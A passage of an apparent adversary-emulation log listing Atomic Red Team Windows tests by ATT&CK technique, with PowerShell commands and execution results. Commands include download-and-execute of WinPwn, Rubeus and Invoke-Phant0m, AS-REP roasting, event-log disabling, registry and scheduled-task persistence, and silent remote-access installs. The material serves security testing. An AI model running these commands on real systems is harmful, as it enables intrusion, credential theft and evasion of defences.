            'New-ScheduledTaskPrincipal -GroupId "BUILTIN\\Administrators" '
            '-RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = '
            'New-ScheduledTask -Action $Action -Principal $User -Trigger '
            '$Trigger -Settings $Set; Register-ScheduledTask AtomicTask '
            '-InputObject $object',
 'delegated': '2023-11-27T23:51:38Z',
 'description': 'Create an atomic scheduled task that leverages native '
                'powershell cmdlets.\n'
                '\n'
                'Upon successful execution, powershell.exe will create a '
                'scheduled task to spawn cmd.exe at 20:10.\n',
 'executor': 'psh',
 'link_id': '81c201e3-eb8c-4e90-a934-c040981c0e3b',
 'name': 'Powershell Cmdlet Scheduled Task',
 'pid': 11088,
 'plaintext_command': '$Action = New-ScheduledTaskAction -Execute "calc.exe"; '
                      '$Trigger = New-ScheduledTaskTrigger -AtLogon; $User = '
                      'New-ScheduledTaskPrincipal -GroupId '
                      '"BUILTIN\\Administrators" -RunLevel Highest; $Set = '
                      'New-ScheduledTaskSettingsSet; $object = '
                      'New-ScheduledTask -Action $Action -Principal $User '
                      '-Trigger $Trigger -Settings $Set; '
                      'Register-ScheduledTask AtomicTask -InputObject $object',
 'platform': 'windows',
 'run': '2023-11-27T23:51:52Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546__multiple__event_triggered_execution__495536c73651969fd80a8f263c293194__trial_1

atomic_ordering: ['495536c73651969fd80a8f263c293194']
------------------------------
{'ability_id': '495536c73651969fd80a8f263c293194',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546',
            'technique_name': 'Event Triggered Execution'},
 'command': '$path = "HKCU:\\Software\\Microsoft\\Command Processor"; if '
            '(!(Test-Path -path $path)){;   New-Item -ItemType Key -Path '
            '$path; }; New-ItemProperty -Path $path -Name "AutoRun" -Value '
            '"notepad.exe" -PropertyType "String"',
 'delegated': '2023-12-01T23:00:26Z',
 'description': 'An adversary may abuse the CommandProcessor AutoRun registry '
                'key to persist. Every time cmd.exe is executed, the command '
                'defined in the AutoRun key also gets executed.\n'
                '[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)',
 'executor': 'psh',
 'link_id': 'cc048355-1ee1-4658-8ce1-aa8bf812f95d',
 'name': 'HKCU - Persistence using CommandProcessor AutoRun key (Without '
         'Elevation)',
 'pid': 3240,
 'plaintext_command': '$path = "HKCU:\\Software\\Microsoft\\Command '
                      'Processor"; if (!(Test-Path -path $path)){;   New-Item '
                      '-ItemType Key -Path $path; }; New-ItemProperty -Path '
                      '$path -Name "AutoRun" -Value "notepad.exe" '
                      '-PropertyType "String"',
 'platform': 'windows',
 'run': '2023-12-01T23:00:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__bdc2a80d621d3361ea727008644b1d15__trial_1

atomic_ordering: ['bdc2a80d621d3361ea727008644b1d15']
------------------------------
{'ability_id': 'bdc2a80d621d3361ea727008644b1d15',
 'agent_reported_time': '2023-11-11T13:09:30Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.008',
            'technique_name': 'Email Collection: Mailbox Manipulation'},
 'command': 'New-Item -Path '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
            '-ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data" '
            '-Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName '
            '-Destination '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
            '-Recurse -Force -ErrorAction Ignore }; Get-ChildItem -Path '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
            '-File | ForEach-Object { Add-Content -Path $_.FullName -Value '
            '"Modification for Atomic Red Test" -ErrorAction Ignore }',
 'delegated': '2023-11-28T20:32:23Z',
 'description': 'Copies and modifies mail data on Windows\n',
 'executor': 'psh',
 'link_id': '25636727-95d2-4a74-a8cd-71a3fad07d43',
 'name': 'Copy and Modify Mailbox Data on Windows',
 'pid': 11116,
 'plaintext_command': 'New-Item -Path '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
                      '-ItemType Directory -ErrorAction Ignore; Get-ChildItem '
                      '-Path '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data" '
                      '-Exclude copy | ForEach-Object { Copy-Item -Path '
                      '$_.FullName -Destination '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
                      '-Recurse -Force -ErrorAction Ignore }; Get-ChildItem '
                      '-Path '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
                      '-File | ForEach-Object { Add-Content -Path $_.FullName '
                      '-Value "Modification for Atomic Red Test" -ErrorAction '
                      'Ignore }',
 'platform': 'windows',
 'run': '2023-11-28T20:32:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__b8e136dad1af7b29939e86be6d7ecefa__trial_1

atomic_ordering: ['b8e136dad1af7b29939e86be6d7ecefa']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_002__defense-evasion__impair_defenses-_disable_windows_event_logging__47ba984c0c40a7c41b4797156c1a5f96__trial_1

atomic_ordering: ['47ba984c0c40a7c41b4797156c1a5f96']
------------------------------
{'ability_id': '47ba984c0c40a7c41b4797156c1a5f96',
 'agent_reported_time': '2023-11-11T13:10:24Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.002',
            'technique_name': 'Impair Defenses: Disable Windows Event Logging'},
 'command': 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy '
            'RemoteSigned -ErrorAction Ignore; $url = '
            '"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"; '
            '$output = "$env:TEMP\\Invoke-Phant0m.ps1"; $wc = New-Object '
            'System.Net.WebClient; $wc.DownloadFile($url, $output); cd '
            '$env:TEMP; Import-Module .\\Invoke-Phant0m.ps1; Invoke-Phant0m',
 'delegated': '2023-12-03T15:04:11Z',
 'description': 'Kill Windows Event Log Service Threads using Invoke-Phant0m. '
                'WARNING you will need to restart PC to return to normal state '
                'with Log Service. '
                'https://artofpwn.com/phant0m-killing-windows-event-log.html',
 'executor': 'psh',
 'link_id': '99836a0f-147d-4b03-b95a-e34896bdf72c',
 'name': 'Kill Event Log Service Threads',
 'pid': 5528,
 'plaintext_command': 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy '
                      'RemoteSigned -ErrorAction Ignore; $url = '
                      '"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"; '
                      '$output = "$env:TEMP\\Invoke-Phant0m.ps1"; $wc = '
                      'New-Object System.Net.WebClient; $wc.DownloadFile($url, '
                      '$output); cd $env:TEMP; Import-Module '
                      '.\\Invoke-Phant0m.ps1; Invoke-Phant0m',
 'platform': 'windows',
 'run': '2023-12-03T15:04:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__3f588ff884129699e1b9a56f2248bc3b__trial_1

atomic_ordering: ['3f588ff884129699e1b9a56f2248bc3b']
------------------------------
{'ability_id': '3f588ff884129699e1b9a56f2248bc3b',
 'agent_reported_time': '2023-11-11T13:09:12Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': 'get-ADPrincipalGroupMembership $env:USERNAME | select name',
 'delegated': '2023-11-28T13:26:01Z',
 'description': 'Permission Groups Discovery utilizing PowerShell. This test '
                'will display some errors if run on a computer not connected '
                'to a domain. Upon execution, domain\n'
                'information will be displayed.\n',
 'executor': 'psh',
 'link_id': 'b30dc768-4242-449a-840d-f0dffafec7a8',
 'name': 'Permission Groups Discovery PowerShell (Domain)',
 'pid': 3568,
 'plaintext_command': 'get-ADPrincipalGroupMembership $env:USERNAME | select '
                      'name',
 'platform': 'windows',
 'run': '2023-11-28T13:26:27Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__f1b3fca18d7465cd10e5a7477a3bf97d__trial_1

atomic_ordering: ['f1b3fca18d7465cd10e5a7477a3bf97d']
------------------------------
{'ability_id': 'f1b3fca18d7465cd10e5a7477a3bf97d',
 'agent_reported_time': '2023-11-11T13:10:29Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Invoke-WebRequest -OutFile '
            'C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi '
            'https://secure.logmein.com/LogMeInIgnition.msi; $file1 = '
            '"C:\\Users\\" + $env:username + "\\Desktop\\LogMeInIgnition.msi"; '
            "Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program "
            'Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe\' "/S"',
 'delegated': '2023-12-01T07:09:36Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'LogMeIn and use to establish C2. Download of LogMeIn '
                'installer will be at the destination location and ran when '
                'sucessfully executed.\n',
 'executor': 'psh',
 'link_id': 'ab229cfb-f861-4b8a-81ef-2e3014cd31d8',
 'name': 'LogMeIn Files Detected Test on Windows',
 'pid': 380,
 'plaintext_command': 'Invoke-WebRequest -OutFile '
                      'C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi '
                      'https://secure.logmein.com/LogMeInIgnition.msi; $file1 '
                      '= "C:\\Users\\" + $env:username + '
                      '"\\Desktop\\LogMeInIgnition.msi"; Start-Process -Wait '
                      "$file1 /quiet; Start-Process 'C:\\Program Files "
                      '(x86)\\LogMeIn Ignition\\LMIIgnition.exe\' "/S"',
 'platform': 'windows',
 'run': '2023-12-01T07:11:23Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__cc5347b500dfbdbb96b1fdb6a0669708__trial_1

atomic_ordering: ['cc5347b500dfbdbb96b1fdb6a0669708']
------------------------------
{'ability_id': 'cc5347b500dfbdbb96b1fdb6a0669708',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.005',
            'technique_name': 'Boot or Logon Autostart Execution: Security '
                              'Support Provider'},
 'command': '$oldvalue = $(Get-ItemProperty '
            'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name '
            "'Security Packages' | Select-Object -ExpandProperty 'Security "
            "Packages'); Set-ItemProperty -Path "
            '"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig" -Name '
            '\'Security Packages old\' -Value "$oldvalue"; $newvalue = '
            '"AtomicTest.dll"; Set-ItemProperty '
            'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name '
            "'Security Packages' -Value $newvalue",
 'delegated': '2023-12-02T06:59:43Z',
 'description': 'Add a value to a Windows registry SSP key, simulating an '
                'adversarial modification of those keys.',
 'executor': 'psh',
 'link_id': 'f3282e83-c671-4942-aa45-09ae5d7574a8',
 'name': 'Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig '
         'Security Support Provider configuration in registry',
 'pid': 7192,
 'plaintext_command': '$oldvalue = $(Get-ItemProperty '
                      'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig '
                      "-Name 'Security Packages' | Select-Object "
                      "-ExpandProperty 'Security Packages'); Set-ItemProperty "
                      '-Path '
                      '"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig" '
                      '-Name \'Security Packages old\' -Value "$oldvalue"; '
                      '$newvalue = "AtomicTest.dll"; Set-ItemProperty '
                      'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig '
                      "-Name 'Security Packages' -Value $newvalue",
 'platform': 'windows',
 'run': '2023-12-02T07:00:00Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1083__discovery__file_and_directory_discovery__d7967a23c8c030c698893f242e622be1__trial_1

atomic_ordering: ['d7967a23c8c030c698893f242e622be1']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__566b2f5743d88edb44ad1d9d450e921c__trial_1

atomic_ordering: ['566b2f5743d88edb44ad1d9d450e921c']
------------------------------
{'ability_id': '566b2f5743d88edb44ad1d9d450e921c',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1082',
            'technique_name': 'System Information Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'RBCD-Check -consoleoutput -noninteractive',
 'delegated': '2023-11-29T01:41:31Z',
 'description': 'Search for Resource-Based Constrained Delegation attack paths '
                'using RBCD-Check function of WinPwn',
 'executor': 'psh',
 'link_id': '087310ad-d0b7-4966-9cf8-f3a5ca82bed5',
 'name': 'WinPwn - RBCD-Check',
 'pid': 10248,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'RBCD-Check -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-11-29T01:41:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__820a346b2b676b51338c1170b675f76b__trial_1

atomic_ordering: ['820a346b2b676b51338c1170b675f76b']
------------------------------
{'ability_id': '820a346b2b676b51338c1170b675f76b',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': "Start-Process $env:ProgramFiles\\'uvnc "
            "bvba\\UltraVnc\\vncviewer.exe'",
 'delegated': '2023-12-01T04:53:20Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'UltraVNC for use as a C2 channel.\n'
                'Upon successful execution, UltraVNC will be executed.\n',
 'executor': 'psh',
 'link_id': '69c89ce0-d33d-4eb8-b04a-ff397e148f80',
 'name': 'UltraVNC Execution',
 'pid': 9200,
 'plaintext_command': "Start-Process $env:ProgramFiles\\'uvnc "
                      "bvba\\UltraVnc\\vncviewer.exe'",
 'platform': 'windows',
 'run': '2023-12-01T04:53:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__4e9bac619326378b219b3635c9a91b94__trial_1

atomic_ordering: ['4e9bac619326378b219b3635c9a91b94']
------------------------------
{'ability_id': '4e9bac619326378b219b3635c9a91b94',
 'agent_reported_time': '2023-11-11T13:10:29Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.004',
            'technique_name': 'Access Token Manipulation: Parent PID Spoofing'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-Process '
            '-FilePath $Env:windir\\System32\\notepad.exe -PassThru | '
            'Start-ATHProcessUnderSpecificParent -FilePath '
            '$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
            "-CommandLine '-Command Start-Sleep 10'",
 'delegated': '2023-11-30T07:55:50Z',
 'description': 'Creates a notepad.exe process and then spawns a '
                'powershell.exe process as a child of it.',
 'executor': 'psh',
 'link_id': '2063e501-540f-4d2c-bedd-db933d3dc97b',
 'name': 'Parent PID Spoofing - Spawn from New Process',
 'pid': 2604,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Start-Process -FilePath '
                      '$Env:windir\\System32\\notepad.exe -PassThru | '
                      'Start-ATHProcessUnderSpecificParent -FilePath '
                      '$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
                      "-CommandLine '-Command Start-Sleep 10'",
 'platform': 'windows',
 'run': '2023-11-30T07:57:04Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1564__defense-evasion__hide_artifacts__b7f89af9214876eae185527350ca034f__trial_1

atomic_ordering: ['b7f89af9214876eae185527350ca034f']
------------------------------
{'ability_id': 'b7f89af9214876eae185527350ca034f',
 'agent_reported_time': '2023-11-11T13:10:47Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1564',
            'technique_name': 'Hide Artifacts'},
 'command': '$macro = '
            '[System.IO.File]::ReadAllText("PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt"); '
            '$macro = $macro -replace "aREPLACEMEa", '
            '"PathToAtomicsFolder\\T1564\\bin\\extractme.bin"; '
            '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroCode "$macro" '
            '-officeProduct "Word" -sub "Extract" -NoWrap',
 'delegated': '2023-12-03T20:51:59Z',
 'description': 'This module extracts a binary (calc.exe) from inside of '
                'another binary. \n'
                '\n'
                'In the wild maldoc authors will use this technique to hide '
                'binaries inside of files stored \n'
                'within the office document itself. An example of this '
                'technique can be seen in sample\n'
                '\n'
                'f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n'
                '\n'
                'This sample contains a document inside of itself. Document 1 '
                'is the actual maldoc itself, document 2\n'
                'is the same document without all the malicious code. Document '
                '1 will copy Document 2 to the file system\n'
                'and then "peek" inside of this document and pull out the '
                'oleObject.bin file. Contained inside of this\n'
                'oleObject.bin file is a payload that is parsed out and '
                'executed on the file system.\n',
 'executor': 'psh',
 'link_id': '85d9ace1-10e9-49c7-acc7-9cb4a874cfc4',
 'name': 'Extract binary files via VBA',
 'pid': 7344,
 'plaintext_command': '$macro = '
                      '[System.IO.File]::ReadAllText("PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt"); '
                      '$macro = $macro -replace "aREPLACEMEa", '
                      '"PathToAtomicsFolder\\T1564\\bin\\extractme.bin"; '
                      '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroCode "$macro" '
                      '-officeProduct "Word" -sub "Extract" -NoWrap',
 'platform': 'windows',
 'run': '2023-12-03T20:52:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__488ec76af9bd3c5d9feb1d660504b541__trial_1

atomic_ordering: ['488ec76af9bd3c5d9feb1d660504b541']
------------------------------
{'ability_id': '488ec76af9bd3c5d9feb1d660504b541',
 'agent_reported_time': '2023-11-11T13:10:45Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1082',
            'technique_name': 'System Information Discovery'},
 'command': 'cscript "d06deb_griffon_recon.vbs"',
 'delegated': '2023-11-29T01:21:54Z',
 'description': 'This script emulates the reconnaissance script seen in used '
                'by Griffon and was modified by security researcher Kirk '
                'Sayre \n'
                'in order simply print the recon results to the screen as '
                'opposed to exfiltrating them. '
                '[Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \n'
                'For more information see also '
                '[https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) '
                'and '
                '[https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)',
 'executor': 'psh',
 'link_id': '6f8d72d7-512a-4991-ace4-304628c7b5da',
 'name': 'Griffon Recon',
 'pid': 7136,
 'plaintext_command': 'cscript "d06deb_griffon_recon.vbs"',
 'platform': 'windows',
 'run': '2023-11-29T01:22:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__52928f462ea8f5fa617aa8c815f5598b__trial_1

atomic_ordering: ['52928f462ea8f5fa617aa8c815f5598b']
------------------------------
{'ability_id': '52928f462ea8f5fa617aa8c815f5598b',
 'agent_reported_time': '2023-11-11T13:09:50Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.004',
            'technique_name': 'Steal or Forge Kerberos Tickets: AS-REP '
                              'Roasting'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); "
            'Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"',
 'delegated': '2023-12-03T07:56:12Z',
 'description': 'PowerSharpPack - Kerberoasting Using Rubeus technique via '
                'function of WinPwn',
 'executor': 'psh',
 'link_id': '14775977-a6c5-44ea-94a6-07c02d3f1611',
 'name': 'WinPwn - PowerSharpPack - Kerberoasting Using Rubeus',
 'pid': 5416,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); "
                      'Invoke-Rubeus -Command "asreproast /format:hashcat '
                      '/nowrap"',
 'platform': 'windows',
 'run': '2023-12-03T07:56:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__106045f14741390cfb3fe95300585fb6__trial_1

atomic_ordering: ['106045f14741390cfb3fe95300585fb6']
------------------------------
{'ability_id': '106045f14741390cfb3fe95300585fb6',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType '
            'Hyphen -CommandParamVariation C -UseEncodedArguments '
            '-EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop',
 'delegated': '2023-11-28T05:42:35Z',
 'description': 'Executes powershell.exe with variations of the -Command '
                'parameter with encoded arguments supplied',
 'executor': 'psh',
 'link_id': 'dce593b9-3f96-41f0-bb98-57517872ed53',
 'name': 'ATHPowerShellCommandLineParameter -Command parameter variations with '
         'encoded arguments',
 'pid': 11120,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Out-ATHPowerShellCommandLineParameter '
                      '-CommandLineSwitchType Hyphen -CommandParamVariation C '
                      '-UseEncodedArguments -EncodedArgumentsParamVariation EA '
                      '-Execute -ErrorAction Stop',
 'platform': 'windows',
 'run': '2023-11-28T05:43:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__b6ebae300e5ff115e965cc9179d4f831__trial_1

atomic_ordering: ['b6ebae300e5ff115e965cc9179d4f831']
------------------------------
{'ability_id': 'b6ebae300e5ff115e965cc9179d4f831',
 'agent_reported_time': '2023-11-11T13:10:33Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Invoke-WebRequest -OutFile '
            'C:\\Users\\$env:username\\Downloads\\GoToAssist.exe '
            '"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"; '
            '$file1 = "C:\\Users\\" + $env:username + '
            '"\\Downloads\\GoToAssist.exe"; Start-Process $file1 /S;',
 'delegated': '2023-12-01T06:10:59Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'GoToAssist and use to establish C2. Download of GoToAssist '
                'installer will be at the destination location and ran when '
                'sucessfully executed.\n',
 'executor': 'psh',
 'link_id': '13482874-5cf9-4e90-8cd3-81d4fd8bf254',
 'name': 'GoToAssist Files Detected Test on Windows',
 'pid': 9200,
 'plaintext_command': 'Invoke-WebRequest -OutFile '
                      'C:\\Users\\$env:username\\Downloads\\GoToAssist.exe '
                      '"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"; '
                      '$file1 = "C:\\Users\\" + $env:username + '
                      '"\\Downloads\\GoToAssist.exe"; Start-Process $file1 /S;',
 'platform': 'windows',
 'run': '2023-12-01T06:12:01Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__f2d48f9efed23e058bfe0f46d93d07a2__trial_1

atomic_ordering: ['f2d48f9efed23e058bfe0f46d93d07a2']
------------------------------
{'ability_id': 'f2d48f9efed23e058bfe0f46d93d07a2',
 'agent_reported_time': '2023-11-11T13:10:29Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.001',
            'technique_name': 'Unsecured Credentials: Credentials In Files'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'powershellsensitive -consoleoutput -noninteractive',
 'delegated': '2023-12-02T16:05:05Z',
 'description': 'Check Powershell event logs for credentials or other '
                'sensitive information via winpwn powershellsensitive '
                'function.',
 'executor': 'psh',
 'link_id': '71ca919a-5f60-4a99-9e2b-c32a25176656',
 'name': 'WinPwn - powershellsensitive',
 'pid': 6340,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'powershellsensitive -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-02T16:06:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__bba7fe7940f8719efa3c38e54ec79e2c__trial_1

atomic_ordering: ['bba7fe7940f8719efa3c38e54ec79e2c']
------------------------------
{'ability_id': 'bba7fe7940f8719efa3c38e54ec79e2c',
 'agent_reported_time': '2023-11-11T13:10:30Z',
 'attack': {'tactic': 'execution',
